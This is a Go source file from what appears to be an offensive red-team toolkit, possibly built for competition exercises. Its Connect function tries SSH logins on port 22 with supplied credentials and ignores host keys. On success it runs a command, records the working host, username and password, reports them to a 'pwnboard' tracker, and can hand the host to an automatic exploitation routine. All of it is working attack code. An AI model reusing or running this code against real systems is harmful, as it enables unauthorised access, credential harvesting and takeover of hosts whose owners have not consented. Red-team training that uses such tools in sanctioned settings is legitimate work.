package sshClient

import (
	"fmt"
	"os"
	"sync"
	"time"

	"github.com/opt/red-script/internal/autopwn"
	"github.com/opt/red-script/internal/files"
	"github.com/opt/red-script/internal/pwnboard"
	"golang.org/x/crypto/ssh"
)

const ERR_PREFIX string = "ERROR(sshClient): "
const DEFAULT_PORT int = 22

// Function that uses the provided user and password to attempt to log into
//	the provided host. If login is successful, the function will also attempt
//	to alert pwnboard.
func Connect(host, user, password string, scriptPath string, wg *sync.WaitGroup) {
	defer wg.Done()

	sshConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		//HostKeyCallback: ssh.HostKeyCallback(func(hostname string, remote net.Addr, key ssh.PublicKey) error { return nil }),
		Timeout: 10 * time.Second,
	}

	conn, err := ssh.Dial("tcp", host+":"+fmt.Sprint(DEFAULT_PORT), sshConfig)
	if err != nil {
		os.Stderr.WriteString(ERR_PREFIX + "Could not connect to SSH on " + host + " with provided user and password.\n")
		os.Stderr.WriteString(err.Error() + "\n")
		return
	}

	fmt.Println("Successful SSH connection @", host)
	session, err := conn.NewSession()
	if err != nil {
		os.Stderr.WriteString(err.Error())
		session.Close()
		conn.Close()
		return
	}
	err = session.Run("ls")
	if err != nil {
		os.Stderr.WriteString(err.Error())
		session.Close()
		conn.Close()
		return
	}
	conn.Close()

	files.WriterChan <- fmt.Sprintf("ssh:'%s':'%s':'%s'\n", host, user, password)

	pwnboard.SendUpdate(host, fmt.Sprintf("ssh:'%s':'%s':Default creds", user, password))

	if scriptPath != "" {
		autopwn.SSHAutopwn(host, user, password, scriptPath)
	}
}
